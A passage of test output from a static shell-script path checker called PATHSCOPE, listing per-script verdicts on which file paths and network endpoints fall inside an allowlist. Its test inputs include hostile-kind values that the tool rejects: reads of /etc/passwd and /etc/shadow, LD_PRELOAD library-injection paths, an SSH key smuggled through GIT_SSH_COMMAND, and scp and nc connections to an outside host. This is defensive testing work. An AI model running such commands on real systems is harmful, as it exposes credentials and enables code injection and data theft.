UNRESOLVED line=2 kind=unresolved_path reason=cat argument is not statically known: arithmetic expansion expression="/safe/$((1+1))"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== param_default ===
PATHSCOPE shell=param_default.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/passwd verdict=FORBID rule=- sources=NONE uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== param_subst ===
PATHSCOPE shell=param_subst.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=0 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=1 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
UNRESOLVED line=2 kind=unresolved_path reason=cat argument is not statically known: unsupported parameter expansion ${ROOT/x/y} expression="${ROOT/x/y}"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== ansic ===
PATHSCOPE shell=ansic.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/passwd verdict=FORBID rule=- sources=NONE uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== continuation ===
PATHSCOPE shell=continuation.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/input verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== backtick ===
PATHSCOPE shell=backtick.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/shadow verdict=FORBID rule=- sources=NONE uses=line=2:cat
UNRESOLVED line=2 kind=coverage reason=assignment value is not statically known: command substitution expression=unused="`cat /etc/shadow`"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== glob ===
PATHSCOPE shell=glob.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=0 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=1 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
UNRESOLVED line=2 kind=unresolved_path reason=glob expansion makes the path set dynamic expression="$ROOT"/*
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== source ===
PATHSCOPE shell=source.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/lib.sh verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:source
UNRESOLVED line=2 kind=coverage reason=sourced file content is outside the analyzed input expression=source
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== dot_source ===
PATHSCOPE shell=dot_source.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/lib.sh verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:.
UNRESOLVED line=2 kind=coverage reason=sourced file content is outside the analyzed input expression=.
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== xargs ===
PATHSCOPE shell=xargs.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/list verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:xargs
UNRESOLVED line=2 kind=coverage reason=xargs appends operands read from standard input to the command it runs; that operand set is not statically determined expression=xargs
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== multipath ===
PATHSCOPE shell=multipath.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/b verdict=FORBID rule=- sources=NONE uses=line=2:install
PATH value=/safe/a verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:install
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== scp_remote ===
PATHSCOPE shell=scp_remote.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=1
PATHSCOPE unresolved_path_count=1 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/a verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:scp
ENDPOINT value=198.51.100.10:22 verdict=FORBID rule=- sources=NONE uses=line=2:scp
UNRESOLVED line=2 kind=unresolved_path reason=scp remote path operand is a path on the peer host, which this allowlist does not describe expression=gatea@198.51.100.10:/tmp/b
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== nc_client ===
PATHSCOPE shell=nc_client.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=0 resolved_net_endpoint_count=1
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
ENDPOINT value=198.51.100.10:8790 verdict=FORBID rule=- sources=HOST uses=line=2:nc
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== grep_files ===
PATHSCOPE shell=grep_files.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:grep
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== sed_prog ===
PATHSCOPE shell=sed_prog.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:sed
UNRESOLVED line=2 kind=coverage reason=sed program text can open files of its own and is not statically analyzed expression='s/a/b/p'
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== func_positional ===
PATHSCOPE shell=func_positional.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=0 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=1 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
UNRESOLVED line=2 kind=unresolved_path reason=cat argument is not statically known: dynamic shell parameter $1 expression="$1"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== func_body ===
PATHSCOPE shell=func_body.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/ok verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== case_loop ===
PATHSCOPE shell=case_loop.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/other verdict=FORBID rule=- sources=NONE uses=line=5:cat
PATH value=/safe/a verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=4:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== terminal_stat ===
PATHSCOPE shell=terminal_stat.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=1 parse_issue_count=0
PATH value=/safe/conf verdict=ALLOW-LEXICAL rule=/safe/conf [terminal] sources=NONE uses=line=2:stat
UNRESOLVED line=2 kind=provenance reason=allowlisted path has no preregistered-constant provenance expression=/safe/conf
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== terminal_cat ===
PATHSCOPE shell=terminal_cat.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/conf verdict=FORBID rule=- sources=NONE uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== assign_prefix ===
PATHSCOPE shell=assign_prefix.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/evil.so verdict=FORBID rule=- sources=NONE uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== assign_prefix_allow ===
PATHSCOPE shell=assign_prefix_allow.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATH value=/safe/ok.so verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== assign_bare ===
PATHSCOPE shell=assign_bare.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/passwd verdict=FORBID rule=- sources=NONE uses=line=2:assignment prefix
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== assign_benign ===
PATHSCOPE shell=assign_benign.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe verdict=ALLOW-LEXICAL rule=/safe/** sources=PWD uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== assign_export ===
PATHSCOPE shell=assign_export.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/evil.so verdict=FORBID rule=- sources=NONE uses=line=2:export assignment
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=3:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== assign_env ===
PATHSCOPE shell=assign_env.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/evil.so verdict=FORBID rule=- sources=NONE uses=line=2:env assignment
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== assign_multi ===
PATHSCOPE shell=assign_multi.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=3 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/a.so verdict=FORBID rule=- sources=NONE uses=line=2:assignment prefix
PATH value=/etc/b.sh verdict=FORBID rule=- sources=NONE uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c2_list_prefix ===
PATHSCOPE shell=c2_list_prefix.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=4 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/escape verdict=FORBID rule=- sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATH value=/safe/lib verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/lib:/etc/escape verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c2_list_env ===
PATHSCOPE shell=c2_list_env.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=4 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/escape verdict=FORBID rule=- sources=ROOT uses=line=2:env assignment
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATH value=/safe/lib verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:env assignment
PATH value=/safe/lib:/etc/escape verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:env assignment
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c2_list_export ===
PATHSCOPE shell=c2_list_export.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=4 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/escape verdict=FORBID rule=- sources=ROOT uses=line=2:export assignment
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=3:cat
PATH value=/safe/lib verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:export assignment
PATH value=/safe/lib:/etc/escape verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:export assignment
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c2_list_bare_first ===
PATHSCOPE shell=c2_list_bare_first.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=3 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=1 parse_issue_count=0
PATH value=/etc/escape.so verdict=FORBID rule=- sources=NONE uses=line=2:assignment prefix
PATH value=/safe/bare.so:/etc/escape.so verdict=ALLOW-LEXICAL rule=/safe/** sources=NONE uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
UNRESOLVED line=2 kind=provenance reason=allowlisted path has no preregistered-constant provenance expression=LD_PRELOAD=bare.so:/etc/escape.so
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== c2_list_space ===
PATHSCOPE shell=c2_list_space.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=3 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=1 parse_issue_count=0
PATH value=/etc/escape.so verdict=FORBID rule=- sources=NONE uses=line=2:assignment prefix
PATH value=/safe/bare.so /etc/escape.so verdict=ALLOW-LEXICAL rule=/safe/** sources=NONE uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
UNRESOLVED line=2 kind=coverage reason=assignment value is a whitespace-separated word list or command text; the single-pathname and word-list readings differ, this tool does not model which consumer splits it, and an option word carrying an attached pathname is not decomposed expression=LD_PRELOAD="bare.so /etc/escape.so"
UNRESOLVED line=2 kind=provenance reason=allowlisted path has no preregistered-constant provenance expression=LD_PRELOAD="bare.so /etc/escape.so"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== c2_relative ===
PATHSCOPE shell=c2_relative.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/elsewhere/relative/path.so verdict=FORBID rule=- sources=NONE uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c2_empty_member ===
PATHSCOPE shell=c2_empty_member.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=4 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=1 parse_issue_count=0
PATH value=/etc/escape verdict=FORBID rule=- sources=NONE uses=line=2:assignment prefix
PATH value=/safe verdict=ALLOW-LEXICAL rule=/safe/** sources=PWD uses=line=2:assignment prefix
PATH value=/safe/:/etc/escape verdict=ALLOW-LEXICAL rule=/safe/** sources=NONE uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
UNRESOLVED line=2 kind=provenance reason=allowlisted path has no preregistered-constant provenance expression=LD_LIBRARY_PATH=:/etc/escape
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== c2_quoted_space ===
PATHSCOPE shell=c2_quoted_space.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=4 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATH value=/safe dir/escape verdict=FORBID rule=- sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/dir/escape verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
UNRESOLVED line=2 kind=coverage reason=assignment value is a whitespace-separated word list or command text; the single-pathname and word-list readings differ, this tool does not model which consumer splits it, and an option word carrying an attached pathname is not decomposed expression=X="$ROOT dir/escape"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== c2_escaped_space ===
PATHSCOPE shell=c2_escaped_space.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=6 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/escape verdict=FORBID rule=- sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/a verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/a b verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/a b:/etc/escape verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/b:/etc/escape verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
UNRESOLVED line=2 kind=coverage reason=assignment value is a whitespace-separated word list or command text; the single-pathname and word-list readings differ, this tool does not model which consumer splits it, and an option word carrying an attached pathname is not decomposed expression=X=$ROOT/a\ b:/etc/escape
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== c2_command_text ===
PATHSCOPE shell=c2_command_text.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=3 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=1 parse_issue_count=0
PATH value=/etc/key verdict=FORBID rule=- sources=NONE uses=line=2:assignment prefix
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATH value=/safe/ssh -i /etc/key verdict=ALLOW-LEXICAL rule=/safe/** sources=NONE uses=line=2:assignment prefix
UNRESOLVED line=2 kind=coverage reason=assignment value is a whitespace-separated word list or command text; the single-pathname and word-list readings differ, this tool does not model which consumer splits it, and an option word carrying an attached pathname is not decomposed expression=GIT_SSH_COMMAND="ssh -i /etc/key"
UNRESOLVED line=2 kind=provenance reason=allowlisted path has no preregistered-constant provenance expression=GIT_SSH_COMMAND="ssh -i /etc/key"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== c2_uri_forbid ===
PATHSCOPE shell=c2_uri_forbid.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=1
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
ENDPOINT value=198.51.100.10:9999 verdict=FORBID rule=- sources=NONE uses=line=2:assignment prefix
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c2_uri_allow ===
PATHSCOPE shell=c2_uri_allow.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=1
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
ENDPOINT value=127.0.0.1:8790 verdict=ALLOW-LEXICAL rule=127.0.0.1:8790 sources=URL uses=line=2:assignment prefix
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_env_quoted ===
PATHSCOPE shell=c2_env_quoted.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/evil.so verdict=FORBID rule=- sources=NONE uses=line=2:env assignment
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== c2_bare_soname ===
PATHSCOPE shell=c2_bare_soname.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_allow_list ===
PATHSCOPE shell=c2_allow_list.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=4 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/f verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATH value=/safe/lib verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/lib64 verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATH value=/safe/lib:/safe/lib64 verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== c2_benign_scalars ===
PATHSCOPE shell=c2_benign_scalars.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
